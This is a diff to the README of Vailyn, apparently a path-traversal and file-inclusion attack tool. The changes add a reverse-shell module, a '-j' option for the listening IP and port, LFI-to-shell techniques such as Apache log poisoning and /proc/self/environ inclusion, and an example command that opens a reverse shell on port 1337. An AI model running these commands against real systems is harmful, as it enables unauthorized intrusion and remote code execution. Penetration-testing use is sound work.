@@ -52,6 +52,8 @@ Once on your system, you'll need to install the dependencies.
 $ pip install -r requirements.txt   # --user
 ```
 
+If you want to use the reverse shell module, you'll need to have `ncat` and `konsole` installed. Package names vary by distro. Note that this module is Linux-only.
+
 That's it! Fire Vailyn up by moving to its installation directory and performing
 
 ```
@@ -65,12 +67,13 @@ Vailyn has 3 mandatory arguments: `-v VIC, -a ACK and -l FIL PATH`. However, dep
 ```
 mandatory:
   -v VIC, --victim VIC  Target to attack, part 1 [pre injection point]
-  -a ACK, --attack ACK  Attack type (int)[1: query, 2: path, 3:cookie]
-  -l FIL PATH, --lists FIL PATH      
+  -a INT, --attack INT  Attack type (int, 1-4)[see the Markdown docs]
+  -l FILES PATHS, --lists FILES PATHS      
                         Dictionaries to use (see templates for syntax)
 additional:
   -p PAM, --param PAM   query parameter to use for --attack 1
-  -s DAT, --post DAT    POST Data (set injection point with INJECT)
+  -s DATA, --post DATA  POST Data (set injection point with INJECT)
+  -j A P, --listen A P  Try a reverse shell in Phase 2 (A:IP, P:port)
   -d I J, --depths I J  depths of checking (I: phase 1, J: phase 2)
   -n, --loot            Download found files into the loot folder
   -c FIL, --cookie FIL  File containing authentication cookie (if needed)
@@ -78,7 +81,8 @@ additional:
   -i FIL, --check FIL   File to check for in Phase 1 (df: /etc/passwd)
   -q VIC2, --vic2 VIC2  Attack Target, part 2 (post injection point)
   -t, --tor             Pipe attacks through the Tor anonymity network
-  --app                 Start Vailyn's Qt5 interface
+  -k INT, --timeout INT Request Timeout
+  -g, --app             Start Vailyn's Qt5 interface
 ```
 
 Vailyn currently supports 4 attack vectors. The attack performed is identified by the `-a ACK` argument.
@@ -111,13 +115,28 @@ You can modify the lookup depth with the first value of `-d` (default=8).
 
 #### Phase 2
 
-This is the exploitation phase, where Vailyn will try to leak as much files as possible.
+This is the exploitation phase, where Vailyn will try to leak as much files as possible, or gain a reverse shell using various techniques.
 
 The depth of lookup in phase 2 (the maximal number of layers traversed back, and the level of subdirectory recursion) is specified by the second value of the `-d` argument. In future versions, these properties can be changed independently (using 2 arguments).
 
 By specifying `-n`, Vailyn will not only display files on the terminal, but also download and save the files into the loot folder.
 
 If you want a verbose output (display every output, not only found files), you can use `--debug`. Note that output gets really messy, this is basically just a debug help.
+
+To gain a reverse shell, you can use the `-j A P` argument, where A is your listening IP, and P the port you want to listen on.
+
+> **WARNING**
+>
+> The reverse shell module is NOT production-ready yet! Not all techniques have been implemented yet, and the implemented ones still need polishing.
+>
+> Also, beware that YOUR IP WILL BE VISIBLE IN THE SERVER LOGS.
+
+The techniques (only work for LFI inclusions):
+
+* `/proc/self/environ inclusion` only works on outdated servers
+* `Apache Log Poisoning & inclusion`
+* `SSH Log Poisoning` _TODO_
+* `poisoned mail inclusion` _TODO_
 
 ### False Positive prevention
 
@@ -153,6 +172,10 @@ will infect DATA2 with the payload
 
 * Attack, but target is behind login screen:
 `$ Vailyn -v "http://site.com/download.php" -a 1 -l dicts/files dicts/dirs -c cookie.txt`
+
+* Attack, but I want a reverse shell on port 1337:
+`$ Vailyn -v "http://site.com/download.php" -a 1 -l dicts/files dicts/dirs -j MY.IP.IS.XX 1337`
+(will start a ncat listener for you)
 
 ### Demo
 
